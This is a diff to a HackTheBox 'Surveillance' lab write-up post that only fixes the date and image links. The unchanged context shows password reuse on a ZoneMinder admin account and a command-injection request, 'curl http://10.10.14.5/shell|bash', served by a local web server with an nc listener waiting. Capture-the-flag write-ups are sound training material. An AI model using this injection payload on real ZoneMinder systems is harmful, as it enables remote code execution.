@@ -1,7 +1,7 @@
 ---
 layout: post
 title: HackTheBox Surveillance
-date: 2024-12-09
+date: 2024-09-12
 tags: [HackTheBox, Linux]
 ---
 
@@ -31,7 +31,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 7.14 seconds
 ```
 
-![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/website.png)
+![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/website.png?raw=true)
 
 ```bash
 $ feroxbuster -u http://surveillance.htb -q --filter-status 404,503
@@ -44,7 +44,7 @@ $ feroxbuster -u http://surveillance.htb -q --filter-status 404,503
 ...
 ```
 
-![login_webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/login_webpage.png)
+![login_webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/login_webpage.png?raw=true)
 
 There login page did not display the version of the CMS but the source code of the index page did.
 
@@ -327,11 +327,11 @@ matthew@surveillance.htb's password: starcraft122490
 matthew@surveillance:~$ 
 ```
 
-![localhost_website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/localhost_website.png)
+![localhost_website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/localhost_website.png?raw=true)
 
 The credentials `matthew:starcraft122490` does not work but `admin:starcraft122490` works.
 
-![zoneminder_dashboard](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/zoneminder_dashboard.png)
+![zoneminder_dashboard](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/zoneminder_dashboard.png?raw=true)
 
 This version of `ZoneMinder` is vulnerable to SQL Injection according to this [GitHub advisory](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-222j-wh8m-xjrx).
 
@@ -342,7 +342,7 @@ Leverage on the data from Metasploit’s [module](https://github.com/rapid7/meta
 >       -   `data = "view=snapshot&action=create&monitor_ids[0][Id]=;#{command}"`
 >   -   Forward edited request.
 
-![intercept_login_request](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/intercept_login_request.png)
+![intercept_login_request](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/intercept_login_request.png?raw=true)
 
 >   `view=snapshot&action=create&monitor_ids[0][Id]=;curl+http%3a//10.10.14.5/shell|bash&__csrf_magic=key%3Af8dc3b7201112c84059d7ccd226d549fa01a6173%2C1719736107`
 
@@ -355,7 +355,7 @@ $ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-![intercept_login_request_edit](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/intercept_login_request_edit.png)
+![intercept_login_request_edit](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Surveillance/intercept_login_request_edit.png?raw=true)
 
 ```bash
 nc -nlvp 9999
